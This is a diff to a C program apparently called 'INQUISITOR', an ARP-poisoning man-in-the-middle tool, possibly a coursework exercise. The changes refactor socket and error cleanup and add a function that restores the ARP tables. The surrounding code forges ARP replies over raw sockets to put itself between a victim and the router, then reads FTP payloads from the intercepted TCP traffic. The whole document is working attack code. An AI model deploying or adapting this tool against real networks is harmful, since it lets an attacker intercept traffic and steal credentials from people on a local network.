@@ -23,6 +23,14 @@ static void usage(void)
 	exit(1);
 }
 
+static void cleaning(int socket, struct ifaddrs *ifaddr)
+{
+	if (socket > 0)
+		close(socket);
+	if (ifaddr)
+		freeifaddrs(ifaddr);
+}
+
 void error(const char *message)
 {
 	printf("[INQUISITOR] error: %s\n", message);
@@ -69,13 +77,13 @@ static int raw_socket()
 
 	sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
 	if (sock_fd < 0)
-		error("socket failed");
+		return (0);
 	if (setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, &tv_out, sizeof(tv_out)) < 0)
-		error("configure socket options failed");
+		return (sock_fd);
 	return (sock_fd);
 }
 
-static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
+static int send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
 {
 	struct sockaddr_ll sll;
 
@@ -87,7 +95,8 @@ static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned ch
 	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);
 
 	if (sendto(sock, pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
-		error("Failed to send");
+		return (0);
+	return (1);
 }
 
 static void fill_arp_request(t_session session, struct arp_packet *pkt, int protocol)
@@ -130,15 +139,11 @@ static unsigned char *receive_arp_response(int socket)
 	return (0);
 }
 
-static void get_access_point_mac(int socket, unsigned int *index, t_session session, t_pair *access_point)
+static void get_access_point_mac(int socket, unsigned int *index, t_session session, t_pair *access_point, struct ifaddrs *ifaddr)
 {
 	unsigned char *temp_mac;
-	struct ifaddrs *ifaddr;
 	struct arp_packet pkt;
 	t_session first;
-
-	if (getifaddrs(&ifaddr) == -1)\
-		error("cannot access mac address of the system");
 
 	char *name = get_nic(ifaddr);
 	*index = if_nametoindex(name);           
@@ -147,13 +152,47 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 	first.dst.ip = session.src.ip;
 	memset(first.dst.mac, 0, 6);
 	fill_arp_request(first, &pkt, ARPOP_REQUEST);
-	send_packet(socket, *index, &pkt, pkt.eth.h_dest);
+	if (send_packet(socket, *index, &pkt, pkt.eth.h_dest) == 0)
+	{
+		cleaning(socket, ifaddr);
+		error("Failed to send");
+	}
 	temp_mac = receive_arp_response(socket);
 	if (temp_mac)
     	memcpy(access_point->mac, temp_mac, 6);
 	else 
+	{
+		cleaning(socket, ifaddr);
 		error("Cannot get access point MAC");
-	freeifaddrs(ifaddr);
+	}
+}
+
+static void arp_restore(int sock, int index, t_session session, t_pair access_point)
+{
+	t_session router_session;
+	struct arp_packet router_packet;
+	struct arp_packet victim_packet;
+	
+	memcpy(session.src.mac, access_point.mac, 6);
+	//RESTORE ROUTER 
+	//session -> src -> ip victim  
+	//session -> src -> mac victim 
+	//session -> dst -> ip router  
+	//session -> dst -> mac router 
+	fill_arp_request(session, &victim_packet, ARPOP_REPLY);
+	send_packet(sock, index, &victim_packet, session.dst.mac);
+
+	router_session.src.ip = session.dst.ip;
+	memcpy(router_session.src.mac, session.dst.mac, 6);
+	router_session.dst.ip = session.src.ip;
+	memcpy(router_session.dst.mac, session.src.mac, 6);
+	//RESTORE VICTIM 
+	//router_session -> src -> ip router  
+	//router_session -> src -> mac router 
+	//router_session -> dst -> ip victim  
+	//router_session -> dst -> mac victim 
+	fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
+	send_packet(sock, index, &router_packet, router_session.dst.mac);
 }
 
 static void poisoning(int sock, int index, t_session session, t_pair access_point)
@@ -164,6 +203,7 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 	time_t last_poison = 0;
 	unsigned char buffer[2048];
 
+	//t_session router_session;
 	router_session = session;
 	router_session.src.ip = session.dst.ip;
 	router_session.dst.ip = session.src.ip;
@@ -200,7 +240,7 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 		{
 			struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));
 
-			// Calculamos dónde empiezan los datos del FTP
+			//calculo dónde empiezan los datos del FTP
 			unsigned char *payload = (unsigned char *)tcp + (tcp->th_off * 4);
 			int payload_size = bytes - (sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->th_off * 4));
 
@@ -213,6 +253,7 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 			}
 		}
 	}
+	arp_restore(sock, index, session, access_point);
 }
 
 //signal handler
@@ -224,17 +265,26 @@ static void loop_handler(int sig)
 
 int main (int ac, char *av[])
 {
-	int socket;
+	int socket = 0;
 	unsigned int index;
 	t_session session;
 	t_pair access_point;
+	struct ifaddrs *ifaddr;
 
 	if (ac != 5)	
 		usage();
 	parse_input(av, &session);
+	if (getifaddrs(&ifaddr) == -1)\
+		error("cannot access mac address of the system");
 	socket = raw_socket();
-	get_access_point_mac(socket, &index, session, &access_point);
+	if (socket <= 0)
+	{
+		cleaning(socket, ifaddr);
+		error("socket failed");
+	}
+	get_access_point_mac(socket, &index, session, &access_point, ifaddr);
 	signal(SIGINT, loop_handler);
 	poisoning(socket, index, session, access_point);
+	cleaning(socket, ifaddr);
 	return (0);
 }
